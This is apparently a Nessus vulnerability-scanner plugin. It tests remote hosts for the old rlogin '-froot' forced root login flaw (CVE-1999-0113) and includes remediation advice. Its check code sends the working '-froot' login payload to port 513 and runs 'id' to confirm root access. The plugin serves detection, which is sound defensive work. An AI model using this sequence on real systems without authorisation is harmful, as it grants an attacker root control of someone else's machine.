#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10161);
 script_version ("1.19");
 script_cve_id("CVE-1999-0113");
 script_bugtraq_id(458);

 script_name(english: "rlogin -froot Remote Root Access");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to connect to this host as 'root' without a password." );
 script_set_attribute(attribute:"description", value:
"The remote /bin/login seems to be affected by a 'forced root login'
vulnerability.  By attempting to connet via rlogin and forcing it to
use the root account (rlogin -froot), any attacker may use this flaw
to gain remote root access on this system." );
 script_set_attribute(attribute:"solution", value:
"Upgrade your /bin/login, or comment out the 'rlogin' line in 
/etc/inetd.conf and restart the inetd process" );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
 script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
 script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/08/26");
 script_set_attribute(attribute:"vuln_publication_date", value: "1994/05/21");
 script_cvs_date("Date: 2018/07/27 18:38:14");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english: "Checks for rlogin -froot");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2018 and is owned by Tenable, Inc. or an Affiliate thereof.");
 script_family(english: "Gain a shell remotely");
 script_dependencie("find_service1.nasl", "rlogin.nasl");
 script_require_ports("Services/rlogin", 513);
 exit(0);
}

include("data_protection.inc");

#
# The script code starts here
#

port = get_kb_item("Services/rlogin");
if(!port)port = 513;

if(get_port_state(port))
{
 soc = open_priv_sock_tcp(dport:port);
 if(soc)
 {
  s1 = raw_string(0);
  s2 = "-froot" + raw_string(0) + "-froot" + raw_string(0) + "id" + raw_string(0);
  send(socket:soc, data:s1);
  send(socket:soc, data:s2);
  a = recv(socket:soc, length:1024, min:1);
  if(strlen(a))
   {
   send(socket:soc, data:string("id\r\n"));
   r = recv(socket:soc, length:4096);
   if ("uid=" >< r)
     security_hole(port:port, 
      extra: '\nThe \'id\' command returned :\n\n' + data_protection::sanitize_uid(output:r));
   }
  close(soc);
 }
}
